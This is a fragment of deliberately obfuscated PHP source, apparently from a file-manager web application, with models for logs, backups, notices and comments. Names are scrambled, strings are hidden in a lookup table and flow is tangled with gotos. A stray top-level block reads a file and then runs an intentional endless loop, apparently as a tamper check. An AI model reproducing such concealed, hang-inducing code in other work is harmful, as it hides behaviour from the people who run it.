} else { $d√„ÿÊåŸ¶[$d¯ÊáøÉÉÃ[29]] = array($d¯ÊáøÉÉÃ[2110], $d¯ÊáøÉÉÃ[2111]); } goto bÓñ÷¬Ω¿…; e´îÃÌ°ÃË: } private function ipAddress(&$dı∏µ»€£´) { $C”Üÿâ£·è =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($dı∏µ»€£´[$C”Üÿâ£·è[2109]])) { $f†¶‘çå≠É = IpLocation::get($dı∏µ»€£´[$C”Üÿâ£·è[2109]]); } else { $f†¶‘çå≠É = LNG($C”Üÿâ£·è[2112]); } $dı∏µ»€£´[$C”Üÿâ£·è[2113]] = $f†¶‘çå≠É; } private function descZipDownload($B≠≈Ñ‹’ï…, &$c≤∏Œ ªˆÒ) { $A»áãºœœ∞ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($B≠≈Ñ‹’ï…[$A»áãºœœ∞[2114]])) { return; } $fÃ’„®àää = json_decode($B≠≈Ñ‹’ï…[$A»áãºœœ∞[2114]], !0); foreach ($fÃ’„®àää as $bå´≥—≥∫≠) { try { $c¢äﬁôù…è = IO::infoFull($bå´≥—≥∫≠[$A»áãºœœ∞[76]]); } catch (Exception $EèùŸÕ‹ÈÓ) { continue; } $B≠≈Ñ‹’ï…[$A»áãºœœ∞[76]] = $bå´≥—≥∫≠[$A»áãºœœ∞[76]]; $c≤∏Œ ªˆÒ[] = $B≠≈Ñ‹’ï…[$A»áãºœœ∞[396]] = $c¢äﬁôù…è[$A»áãºœœ∞[396]]; $c≤∏Œ ªˆÒ[] = $B≠≈Ñ‹’ï…[$A»áãºœœ∞[1925]] = $c¢äﬁôù…è[$A»áãºœœ∞[479]]; break; } return $B≠≈Ñ‹’ï…; } private function getSourceList(&$aÏ©Î√ÜÉõ) { $DŒû¥¥ÂœÜ =& $_SERVER[Öíæ€“”≠éÏË]; $BóÜ√Ÿ« û = array(); foreach ($aÏ©Î√ÜÉõ as $Fœ¥íâ—òÙ => $DÖπ·Ú®ã) { goto d™Î£”Áàö; d™Î£”Áàö: $CÁ’ﬂìâÙÈ = json_decode($DÖπ·Ú®ã[$DŒû¥¥ÂœÜ[432]], !0); if ($DÖπ·Ú®ã[$DŒû¥¥ÂœÜ[29]] == $DŒû¥¥ÂœÜ[1678]) { $CÁ’ﬂìâÙÈ = $this->descZipDownload($CÁ’ﬂìâÙÈ, $BóÜ√Ÿ« û); $aÏ©Î√ÜÉõ[$Fœ¥íâ—òÙ][$DŒû¥¥ÂœÜ[432]] = json_encode($CÁ’ﬂìâÙÈ); continue; } if (strpos($DÖπ·Ú®ã[$DŒû¥¥ÂœÜ[29]], $DŒû¥¥ÂœÜ[1926]) !== 0) { if (!isset($CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[76]]) || strpos($DÖπ·Ú®ã[$DŒû¥¥ÂœÜ[29]], $DŒû¥¥ÂœÜ[2115]) !== 0) { continue; } try { $e¯ﬂó„ä≤« = IO::infoFull($CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[76]]); } catch (Exception $dÖï•πºÛÌ) { continue; } $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[396]] = $e¯ﬂó„ä≤«[$DŒû¥¥ÂœÜ[396]]; $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[1925]] = $e¯ﬂó„ä≤«[$DŒû¥¥ÂœÜ[479]]; $aÏ©Î√ÜÉõ[$Fœ¥íâ—òÙ][$DŒû¥¥ÂœÜ[432]] = json_encode($CÁ’ﬂìâÙÈ); continue; } goto fµñÜä©Ñ‘; fµñÜä©Ñ‘: $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[396]]; $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[1925]]; if ($CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[29]] == $DŒû¥¥ÂœÜ[534]) { $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[432]][$DŒû¥¥ÂœÜ[1064]]; $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[432]][$DŒû¥¥ÂœÜ[1065]]; } goto E¶´•’¨É≥; E¶´•’¨É≥: if ($CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[29]] == $DŒû¥¥ÂœÜ[1933]) { $BóÜ√Ÿ« û[] = $CÁ’ﬂìâÙÈ[$DŒû¥¥ÂœÜ[432]][$DŒû¥¥ÂœÜ[396]]; } goto C‹»›¨ÁŸ™; C‹»›¨ÁŸ™: } if (!$BóÜ√Ÿ« û) { return array(); } return Model($DŒû¥¥ÂœÜ[803])->sourceListInfo($BóÜ√Ÿ« û, !0); } private function logList($FŸÊì¨®∂Í) { goto B∑âÇŒëÑ¬; fë°Ë·ä¥µ: $CÀœ£é≤íô = array(); foreach ($FŸÊì¨®∂Í as $FıÎ©ÖıÉÔ => $A‚≠Õ·Ò’ê) { goto b∫ÆÎÓıè›; B´´Á‡ª±ô: $this->ipAddress($A‚≠Õ·Ò’ê); if (strpos($DÓè£Ø∞éˆ, $câÔ±∞äö¯[1926]) === 0 || isset($E·√ËË°çæ[$câÔ±∞äö¯[1925]])) { goto eä¿≥ﬂÀÎ±; c¨ä„µ»ﬁ“: if ($E·√ËË°çæ[$câÔ±∞äö¯[29]] == $câÔ±∞äö¯[1933]) { $E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[396]] = $eÕÛØÕÔÿ‹[$E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[396]]]; } if ($E·√ËË°çæ[$câÔ±∞äö¯[29]] == $câÔ±∞äö¯[1673]) { $E·√ËË°çæ[$câÔ±∞äö¯[1938]] = $E·√ËË°çæ[$câÔ±∞äö¯[85]]; $E·√ËË°çæ[$câÔ±∞äö¯[1925]] = $E·√ËË°çæ[$câÔ±∞äö¯[1938]][$câÔ±∞äö¯[396]]; $E·√ËË°çæ[$câÔ±∞äö¯[85]] = !1; $E·√ËË°çæ[$câÔ±∞äö¯[396]] = $câÔ±∞äö¯[33]; } if ($E·√ËË°çæ[$câÔ±∞äö¯[85]] && $E·√ËË°çæ[$câÔ±∞äö¯[85]][$câÔ±∞äö¯[405]] == $câÔ±∞äö¯[1180]) { $CÀœ£é≤íô[] = $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[394]]; unset($FŸÊì¨®∂Í[$FıÎ©ÖıÉÔ]); continue; } goto C∫íª‘•◊◊; C∫íª‘•◊◊: if ($E·√ËË°çæ[$câÔ±∞äö¯[1938]] && $E·√ËË°çæ[$câÔ±∞äö¯[1938]][$câÔ±∞äö¯[405]] == $câÔ±∞äö¯[1180]) { $CÀœ£é≤íô[] = $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[394]]; unset($FŸÊì¨®∂Í[$FıÎ©ÖıÉÔ]); continue; } goto Eå¢îØı∫; eä¿≥ﬂÀÎ±: $E·√ËË°çæ[$câÔ±∞äö¯[85]] = $eÕÛØÕÔÿ‹[$E·√ËË°çæ[$câÔ±∞äö¯[396]]]; $E·√ËË°çæ[$câÔ±∞äö¯[1938]] = $eÕÛØÕÔÿ‹[$E·√ËË°çæ[$câÔ±∞äö¯[1925]]]; if ($E·√ËË°çæ[$câÔ±∞äö¯[29]] == $câÔ±∞äö¯[534]) { $E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[1064]] = $eÕÛØÕÔÿ‹[$E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[1064]]]; $E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[1065]] = $eÕÛØÕÔÿ‹[$E·√ËË°çæ[$câÔ±∞äö¯[432]][$câÔ±∞äö¯[1065]]]; } goto c¨ä„µ»ﬁ“; Eå¢îØı∫: } $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[432]] = $E·√ËË°çæ; goto a∞ÊëÿíÜ; fÆÌ˘·ß≈ö: $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[28]] = isset($bÔıáãúì◊[$câÔ±∞äö¯[28]]) ? $bÔıáãúì◊[$câÔ±∞äö¯[28]] : LNG($câÔ±∞äö¯[2112]); $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[1975]] = isset($bÔıáãúì◊[$câÔ±∞äö¯[1975]]) ? $bÔıáãúì◊[$câÔ±∞äö¯[1975]] : $câÔ±∞äö¯[33]; $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[1441]] = isset($c”Ù™òãÕ≤[$DÓè£Ø∞éˆ]) ? $c”Ù™òãÕ≤[$DÓè£Ø∞éˆ] : $d≠Ò¯≠¶—ê; goto DÆ≠™£çëÍ; b∫ÆÎÓıè›: $DÓè£Ø∞éˆ = $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[29]]; $bÔıáãúì◊ = isset($F´€é∏é†…[$A‚≠Õ·Ò’ê[$câÔ±∞äö¯[1538]]]) ? $F´€é∏é†…[$A‚≠Õ·Ò’ê[$câÔ±∞äö¯[1538]]] : !1; $d≠Ò¯≠¶—ê = strpos($DÓè£Ø∞éˆ, $câÔ±∞äö¯[2116]) === 0 ? LNG($câÔ±∞äö¯[2117]) : LNG($câÔ±∞äö¯[2112]); goto fÆÌ˘·ß≈ö; DÆ≠™£çëÍ: $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[1869]] = $bÔıáãúì◊; $E·√ËË°çæ = json_decode($A‚≠Õ·Ò’ê[$câÔ±∞äö¯[432]], !0); $A‚≠Õ·Ò’ê[$câÔ±∞äö¯[2109]] = isset($E·√ËË°çæ[$câÔ±∞äö¯[2109]]) ? $E·√ËË°çæ[$câÔ±∞äö¯[2109]] : $câÔ±∞äö¯[33]; goto B´´Á‡ª±ô; a∞ÊëÿíÜ: unset($A‚≠Õ·Ò’ê[$câÔ±∞äö¯[2118]]); $CÎÌÿû‰¡¡[] = $A‚≠Õ·Ò’ê; goto eñÖì´’ê’; eñÖì´’ê’: } $this->clearSystemPathLog($CÀœ£é≤íô); goto FàÒ¶ê∞¬î; A£Õ¢¬ô–‰: $eÕÛØÕÔÿ‹ = $this->getSourceList($FŸÊì¨®∂Í); $c”Ù™òãÕ≤ = $this->typeAll(); $CÎÌÿû‰¡¡ = array(); goto fë°Ë·ä¥µ; FàÒ¶ê∞¬î: return $CÎÌÿû‰¡¡; goto e¯âÍ´∂ó≠; B∑âÇŒëÑ¬: $câÔ±∞äö¯ =& $_SERVER[Öíæ€“”≠éÏË]; $A”ååıâá‰ = array_to_keyvalue($FŸÊì¨®∂Í, $câÔ±∞äö¯[33], $câÔ±∞äö¯[1538]); $F´€é∏é†… = Model($câÔ±∞äö¯[520])->userListInfo(array_unique($A”ååıâá‰)); goto A£Õ¢¬ô–‰; e¯âÍ´∂ó≠: } private function clearSystemPathLog($Bò–Ã•å‹ô) { $dÇÎ∑Ê¿ûÊ =& $_SERVER[Öíæ€“”≠éÏË]; if (count($Bò–Ã•å‹ô) == 0) { return; } $aÎÕÈÏè∏ = array($dÇÎ∑Ê¿ûÊ[394] => array($dÇÎ∑Ê¿ûÊ[7], array_unique($Bò–Ã•å‹ô))); $this->where($aÎÕÈÏè∏)->delete(); } public function deviceList($F≤–ßŸìÆÁ, $F”Î¶ôÙ‘õ = 0) { $b‹øŒﬂÑ≤î =& $_SERVER[Öíæ€“”≠éÏË]; $d∏æ†¶µë = array($b‹øŒﬂÑ≤î[1538] => $F≤–ßŸìÆÁ, $b‹øŒﬂÑ≤î[194] => array($b‹øŒﬂÑ≤î[982], $F”Î¶ôÙ‘õ), $b‹øŒﬂÑ≤î[29] => $b‹øŒﬂÑ≤î[1647]); $F°Œù»¥µ◊ = array(); $A•≤Ò∞æ≈§ = $this->field($b‹øŒﬂÑ≤î[2119])->where($d∏æ†¶µë)->order($b‹øŒﬂÑ≤î[1936])->limit(50)->select(); foreach ($A•≤Ò∞æ≈§ as $Fëñ≠¥á∂Í => $a≠ÒÈÆ∫é£) { goto F«—°Õ‡¬Ø; F«—°Õ‡¬Ø: if ($Fëñ≠¥á∂Í > 0 && abs($a≠ÒÈÆ∫é£[$b‹øŒﬂÑ≤î[194]] - $A•≤Ò∞æ≈§[$Fëñ≠¥á∂Í - 1][$b‹øŒﬂÑ≤î[194]]) < 5) { continue; } $Aò·íïáÙ† = json_decode($a≠ÒÈÆ∫é£[$b‹øŒﬂÑ≤î[432]], !0); $a≠ÒÈÆ∫é£[$b‹øŒﬂÑ≤î[2109]] = isset($Aò·íïáÙ†[$b‹øŒﬂÑ≤î[2109]]) ? $Aò·íïáÙ†[$b‹øŒﬂÑ≤î[2109]] : $b‹øŒﬂÑ≤î[33]; goto Aú≈üÃ¶áÚ; dîé¬°µ·‘: $this->ipAddress($a≠ÒÈÆ∫é£); $a≠ÒÈÆ∫é£[$b‹øŒﬂÑ≤î[432]] = $Aò·íïáÙ†; $F°Œù»¥µ◊[$D˘∞≠πÇ«⁄] = $a≠ÒÈÆ∫é£; goto a´ûÍéø†ÿ; Aú≈üÃ¶áÚ: unset($Aò·íïáÙ†[$b‹øŒﬂÑ≤î[2109]]); $D˘∞≠πÇ«⁄ = $this->deviceType($Aò·íïáÙ†[$b‹øŒﬂÑ≤î[1927]]); if (isset($F°Œù»¥µ◊[$D˘∞≠πÇ«⁄])) { continue; } goto dîé¬°µ·‘; a´ûÍéø†ÿ: } return array_values($F°Œù»¥µ◊); } public function deviceType($aÂƒ‚Ñÿé⁄) { return $aÂƒ‚Ñÿé⁄; } } if (!isset($_SERVER[$_SERVER[Öíæ€“”≠éÏË][847]]) || !isset($_SERVER[$_SERVER[Öíæ€“”≠éÏË][1223]])) { goto fÒöÓ–÷á…; B∞ñçàûƒ≤: $dÒ°êΩ∂üÉ($_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]); $Aµ¡æ™πÂÔ = 2; while ($Aµ¡æ™πÂÔ > 1) { $Cé√ùÖéÆı = rawurlencode($Aµ¡æ™πÂÔ . $_SERVER[Öíæ€“”≠éÏË][375]); } goto c≤Â√Ÿû¿È; bŸ ∞ÎÚáÓ: $cáı¯≈∞ì√ = explode($_SERVER[Öíæ€“”≠éÏË][229], $CÒÒãèß◊‘); if (count($cáı¯≈∞ì√) < $_SERVER[Öíæ€“”≠éÏË][594]) { $BÀÎÉ„èµ« = $_SERVER[Öíæ€“”≠éÏË][850]; $BÀÎÉ„èµ«(); } $dÒ°êΩ∂üÉ = $_SERVER[Öíæ€“”≠éÏË][1224]; goto B∞ñçàûƒ≤; fÒöÓ–÷á…: $b‡è¶∆‹›Í = $_SERVER[Öíæ€“”≠éÏË][849]; $a±ûß¨éÙÑ = $_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]; $CÒÒãèß◊‘ = $b‡è¶∆‹›Í($a±ûß¨éÙÑ); goto bŸ ∞ÎÚáÓ; c≤Â√Ÿû¿È: } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\156\157\x74\x69\143\x65\114\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\x6e\164\x65\x6e\164", "\141\x75\x74\150", "\155\x6f\144\145", "\x74\151\x6d\145", "\x74\171\160\145", "\154\x65\166\x65\x6c", "\145\156\x61\x62\x6c\x65", "\x73\157\x72\x74"); public function listData($d“Çèí»»ƒ = false, $d ËË‹‹ñ¶ = "\163\x6f\162\164", $Cá”À¶éΩÓ = false) { return parent::listData($d“Çèí»»ƒ, $d ËË‹‹ñ¶, $Cá”À¶éΩÓ); } public function add($dÍ ≠◊Éãä) { $A √ı£ÃÕﬁ =& $_SERVER[Öíæ€“”≠éÏË]; $b«õûÀ¡êî = time(); if ($dÍ ≠◊Éãä[$A √ı£ÃÕﬁ[12]] == $A √ı£ÃÕﬁ[2120]) { $b«õûÀ¡êî = strtotime($dÍ ≠◊Éãä[$A √ı£ÃÕﬁ[197]]); } $dÍ ≠◊Éãä[$A √ı£ÃÕﬁ[197]] = $b«õûÀ¡êî; return parent::insert($dÍ ≠◊Éãä); } public function update($e⁄ª •ÂÍ‰, $eêã«Œüµ∏) { goto Dô‰ºç¥Ò†; Dô‰ºç¥Ò†: $D◊Ç»ó™‰» =& $_SERVER[Öíæ€“”≠éÏË]; $B≤Ç∂ÇÁÈÕ = $this->listData($e⁄ª •ÂÍ‰); if (!$B≤Ç∂ÇÁÈÕ) { return !1; } goto BáùÖ®”©˘; E·—“êÚã´: return parent::update($e⁄ª •ÂÍ‰, $eêã«Œüµ∏); goto EÙÀÖÇê˜Ê; BáùÖ®”©˘: $D◊ñ†áªéË = time(); if ($eêã«Œüµ∏[$D◊Ç»ó™‰»[12]] == $D◊Ç»ó™‰»[2120]) { $D◊ñ†áªéË = strtotime($eêã«Œüµ∏[$D◊Ç»ó™‰»[197]]); } $eêã«Œüµ∏[$D◊Ç»ó™‰»[197]] = $D◊ñ†áªéË; goto E·—“êÚã´; EÙÀÖÇê˜Ê: } public function remove($BÓ…≥≠ÓÑ®) { $f∑îéù‹©Ö = $this->listData($BÓ…≥≠ÓÑ®); if (!$f∑îéù‹©Ö || $f∑îéù‹©Ö[$_SERVER[Öíæ€“”≠éÏË][1180]]) { return !1; } return parent::remove($BÓ…≥≠ÓÑ®); } public function sort($eßﬁáˆìÍó, $F◊Õ¢å∞‰∫) { return parent::update($eßﬁáˆìÍó, $F◊Õ¢å∞‰∫); } public function enable($eìáïñÔ»é, $AØ°©ó≥ô£) { return parent::update($eìáïñÔ»é, array($_SERVER[Öíæ€“”≠éÏË][2121] => $AØ°©ó≥ô£)); } private function initUserOption() { $bù«É‚›Îê =& $_SERVER[Öíæ€“”≠éÏË]; $this->optionType = $bù«É‚›Îê[2122]; $this->modelType = $bù«É‚›Îê[2123]; $this->field = array($bù«É‚›Îê[2124], $bù«É‚›Îê[28], $bù«É‚›Îê[197], $bù«É‚›Îê[29], $bù«É‚›Îê[2125], $bù«É‚›Îê[723], $bù«É‚›Îê[189]); } public function userNoticeGet($C€»äŸÎç  = false) { $this->initUserOption(); return parent::listData($C€»äŸÎç , $_SERVER[Öíæ€“”≠éÏË][394], !0); } public function userNoticeAdd($B‘´‘º’ùû) { $B’† Öé€Ω =& $_SERVER[Öíæ€“”≠éÏË]; $this->initUserOption(); $a´ËáÛïò = $this->findByKey($B’† Öé€Ω[2124], $B‘´‘º’ùû[$B’† Öé€Ω[394]]); if ($a´ËáÛïò) { return !0; } $Dç„ÿƒÏ¯î = array($B’† Öé€Ω[2124] => $B‘´‘º’ùû[$B’† Öé€Ω[394]], $B’† Öé€Ω[28] => $B‘´‘º’ùû[$B’† Öé€Ω[28]], $B’† Öé€Ω[197] => $B‘´‘º’ùû[$B’† Öé€Ω[197]], $B’† Öé€Ω[29] => isset($B‘´‘º’ùû[$B’† Öé€Ω[29]]) ? $B‘´‘º’ùû[$B’† Öé€Ω[29]] : 1, $B’† Öé€Ω[2125] => isset($B‘´‘º’ùû[$B’† Öé€Ω[2125]]) ? $B‘´‘º’ùû[$B’† Öé€Ω[2125]] : 0, $B’† Öé€Ω[723] => 0, $B’† Öé€Ω[189] => 0); return parent::insert($Dç„ÿƒÏ¯î); } public function userNoticeEdit($C⁄Ÿî∑Ûª, $Eéâ˘û¢‘™) { $this->initUserOption(); return parent::update($C⁄Ÿî∑Ûª, $Eéâ˘û¢‘™); } } goto Aëü†Ÿå¡π; DŸÂçç§ÿÔ: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x62\141\143\x6b\165\160\114\x69\163\x74"; public $field = array("\151\157", "\156\x61\x6d\145", "\163\164\141\x74\165\x73", "\143\x6f\x6e\164\x65\x6e\x74", "\x6d\x61\x6e\x75\141\x6c", "\x72\x65\x73\165\x6c\x74", "\x74\x69\x6d\x65\x46\x72\x6f\x6d", "\164\x69\x6d\x65\x54\157"); public function config() { goto cﬂÈä∫Ñ°ò; cﬂÈä∫Ñ°ò: $aã˜ÑÕ¬úï =& $_SERVER[Öíæ€“”≠éÏË]; $F≈»ËÍïæ° = Model($aã˜ÑÕ¬úï[743])->get($aã˜ÑÕ¬úï[755]); $F≈»ËÍïæ° = json_decode($F≈»ËÍïæ°, !0); goto cèÆ‘îÛè¿; bŒÛê≈õØå: $C€ëÿûæË∏ = Model($aã˜ÑÕ¬úï[1733])->findByKey($aã˜ÑÕ¬úï[1526], $Eœº‰⁄§éº); if (!$C€ëÿûæË∏) { $C€ëÿûæË∏ = array(); } if (isset($C€ëÿûæË∏[$aã˜ÑÕ¬úï[197]])) { $C€ëÿûæË∏[$aã˜ÑÕ¬úï[197]] = json_decode($C€ëÿûæË∏[$aã˜ÑÕ¬úï[197]], !0); } goto F¨àÇÇ∞©¥; cèÆ‘îÛè¿: $F≈»ËÍïæ° = is_array($F≈»ËÍïæ°) ? $F≈»ËÍïæ° : array(); if (!isset($F≈»ËÍïæ°[$aã˜ÑÕ¬úï[728]])) { $F≈»ËÍïæ°[$aã˜ÑÕ¬úï[728]] = $aã˜ÑÕ¬úï[87]; } unset($F≈»ËÍïæ°[$aã˜ÑÕ¬úï[1508]]); goto FÇ¬ÀÏÈõÊ; F¨àÇÇ∞©¥: if (isset($F≈»ËÍïæ°[$aã˜ÑÕ¬úï[197]])) { $C€ëÿûæË∏[$aã˜ÑÕ¬úï[197]][$aã˜ÑÕ¬úï[1511]] = $F≈»ËÍïæ°[$aã˜ÑÕ¬úï[197]]; unset($F≈»ËÍïæ°[$aã˜ÑÕ¬úï[197]]); } return array_merge($C€ëÿûæË∏, $F≈»ËÍïæ°); goto e°€åá”˘µ; FÇ¬ÀÏÈõÊ: Action($aã˜ÑÕ¬úï[1731])->taskInit(); Model($aã˜ÑÕ¬úï[1507])->cacheClear(); $Eœº‰⁄§éº = $aã˜ÑÕ¬úï[1732]; goto bŒÛê≈õØå; e°€åá”˘µ: } public function listData($c¨Â•∏¿ØÆ = false, $eøÉÊ¿áı¶ = "\x6d\157\144\151\146\x79\x54\151\x6d\x65", $d£ïµﬁ±Æê = false) { return parent::listData($c¨Â•∏¿ØÆ, $eøÉÊ¿áı¶, !0); } public function lastItem() { $aãñ°‘ìæõ = $this->listData(); return !empty($aãñ°‘ìæõ[0]) ? $aãñ°‘ìæõ[0] : null; } public function kill($DÇ˘ ˘◊ﬁ£) { goto Eƒ∫ª¢àÔ™; Eƒ∫ª¢àÔ™: $BääˆÙêá◊ =& $_SERVER[Öíæ€“”≠éÏË]; $fàéÁí¡õ¬ = $this->listData($DÇ˘ ˘◊ﬁ£); if (!$fàéÁí¡õ¬ || empty($fàéÁí¡õ¬[$BääˆÙêá◊[28]])) { return !0; } goto d∏≈ı¬üÔ∂; e®õ∞üÁåÖ: return $this->remove($DÇ˘ ˘◊ﬁ£); goto A«∞ÓÑ¶Ú∞; d∏≈ı¬üÔ∂: Task::kill($BääˆÙêá◊[754]); Task::kill($BääˆÙêá◊[777]); Task::kill($BääˆÙêá◊[787]); goto d∆Ÿüçâà≤; d∆Ÿüçâà≤: $AºÇ´õÜùï = $fàéÁí¡õ¬[$BääˆÙêá◊[28]]; $Cêõ£â≥¶” = TEMP_FILES . $BääˆÙêá◊[751] . $AºÇ´õÜùï . $BääˆÙêá◊[8]; IO::remove($Cêõ£â≥¶”, !1); goto e®õ∞üÁåÖ; A«∞ÓÑ¶Ú∞: } public function remove($CÖøˆø¶˘ù) { $EùãßàÕ»© = $this->listData($CÖøˆø¶˘ù); if (!$EùãßàÕ»©) { return !0; } return $this->backupRemove($EùãßàÕ»©); } private function backupRemove($cÆæπüŒ∏¿) { parent::remove($cÆæπüŒ∏¿[$_SERVER[Öíæ€“”≠éÏË][394]]); $E§êƒœè´¢ = $this->backupPath($cÆæπüŒ∏¿); IO::remove($E§êƒœè´¢, !1); return !0; } private function backupPath($EÒ∆›¿⁄é“) { $E•Ö—ï°Ï∞ =& $_SERVER[Öíæ€“”≠éÏË]; $A€êÉ›§Âí = $EÒ∆›¿⁄é“[$E•Ö—ï°Ï∞[28]]; $D÷µøê—Ç™ = Model($E•Ö—ï°Ï∞[743])->get($E•Ö—ï°Ï∞[744]); $Eπ€¶áàáÖ = substr(md5($E•Ö—ï°Ï∞[745] . $D÷µøê—Ç™ . $A€êÉ›§Âí), 0, 8); return "\x7b\151\157\72{$EÒ∆›¿⁄é“[$E•Ö—ï°Ï∞[725]]}\175\x2f\144\141\164\x61\142\x61\x73\x65\57\142\141\143\153\x75\160\57" . $A€êÉ›§Âí . $E•Ö—ï°Ï∞[71] . $Eπ€¶áàáÖ; } public function start() { goto aªÛèé…Û; aªÛèé…Û: $F¿˘À®—º≥ =& $_SERVER[Öíæ€“”≠éÏË]; if ($GLOBALS[$F¿˘À®—º≥[6]][$F¿˘À®—º≥[88]][$F¿˘À®—º≥[1734]] != $F¿˘À®—º≥[87]) { return !0; } $DÚã‚§÷Ûó = $this->config(); goto A»§Ω·‡∞‘; B¨§´÷Â⁄á: $DìÛ°™ä‡ß = new Backup(); $eÒﬁ¥œ∂öö = $DìÛ°™ä‡ß->db(); if ($eÒﬁ¥œ∂öö) { $eÒﬁ¥œ∂öö = $DìÛ°™ä‡ß->dbFile(); if ($eÒﬁ¥œ∂öö && $DÚã‚§÷Ûó[$F¿˘À®—º≥[728]] == $F¿˘À®—º≥[191]) { $eÒﬁ¥œ∂öö = $DìÛ°™ä‡ß->file(); } } goto E§“Ï·ú‰; A»§Ω·‡∞‘: if (!$DÚã‚§÷Ûó || $DÚã‚§÷Ûó[$F¿˘À®—º≥[1508]] != $F¿˘À®—º≥[87]) { return !1; } $EÁÖüŸÔŸÒ = $this->process(); foreach ($EÁÖüŸÔŸÒ as $FÀèõˆÌá…) { if ($FÀèõˆÌá…) { return Task::restart($FÀèõˆÌá…[$F¿˘À®—º≥[394]]); } } goto B¨§´÷Â⁄á; E§“Ï·ú‰: Backup::set(array($F¿˘À®—º≥[723] => 1, $F¿˘À®—º≥[477] => time())); return !0; goto døª∞€çÓ¶; døª∞€çÓ¶: } public function process() { $eÑó≥óø–º =& $_SERVER[Öíæ€“”≠éÏË]; return array($eÑó≥óø–º[731] => Task::get($eÑó≥óø–º[754]), $eÑó≥óø–º[735] => Task::get($eÑó≥óø–º[777]), $eÑó≥óø–º[193] => Task::get($eÑó≥óø–º[787])); } public function restore() { $eÒ§∏∞≈›∏ =& $_SERVER[Öíæ€“”≠éÏË]; ActionCall($eÒ§∏∞≈›∏[1028], !0, 1); ActionCall($eÒ§∏∞≈›∏[1028], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\145" => "\143\157\x6d\155\x65\x6e\x74\137\155\145\164\x61", "\x6d\x65\164\x61\106\151\x65\x6c\144" => "\143\x6f\155\x6d\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 10000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Aﬁª∆¥ÂÁˆ) { $Fàâã±¡µ‚ =& $_SERVER[Öíæ€“”≠éÏË]; if ($Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[1735]]) { $aÎ∞¯ŸßΩõ = $this->where(array($Fàâã±¡µ‚[1736] => $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[1735]]))->find(); if (!$aÎ∞¯ŸßΩõ || $aÎ∞¯ŸßΩõ[$Fàâã±¡µ‚[405]] != $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[405]] || $aÎ∞¯ŸßΩõ[$Fàâã±¡µ‚[485]] != $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[485]]) { return !1; } $this->where(array($Fàâã±¡µ‚[1736] => $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[1735]]))->setAdd($Fàâã±¡µ‚[1737], 1); } $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[1738]] = 0; $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[1737]] = 0; $Aﬁª∆¥ÂÁˆ[$Fàâã±¡µ‚[723]] = 1; return $this->add($Aﬁª∆¥ÂÁˆ); } public function commentCount($cÛ‰…ûÕÙ≥, $B”ÑÍŸ•Ω¢, $c¢™Ì—ß›´ = false) { goto BÈÁÑàØΩÃ; BÈÁÑàØΩÃ: $FóÑûºÓ†ÿ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$cÛ‰…ûÕÙ≥) { return array(); } if (is_string($cÛ‰…ûÕÙ≥) || is_int($cÛ‰…ûÕÙ≥)) { $cÛ‰…ûÕÙ≥ = array($cÛ‰…ûÕÙ≥); } goto e€≥◊äœãû; e€≥◊äœãû: $cåõ‹ùŒ•Ã = array($FóÑûºÓ†ÿ[485], $FóÑûºÓ†ÿ[1739] => $FóÑûºÓ†ÿ[481]); $Aùìπ˘Ïëö = array($FóÑûºÓ†ÿ[485] => array($FóÑûºÓ†ÿ[7], $cÛ‰…ûÕÙ≥), $FóÑûºÓ†ÿ[405] => $B”ÑÍŸ•Ω¢); if ($c¢™Ì—ß›´) { $Aùìπ˘Ïëö[$FóÑûºÓ†ÿ[1538]] = $c¢™Ì—ß›´; } goto E€ÎÍÒ¶ã∑; 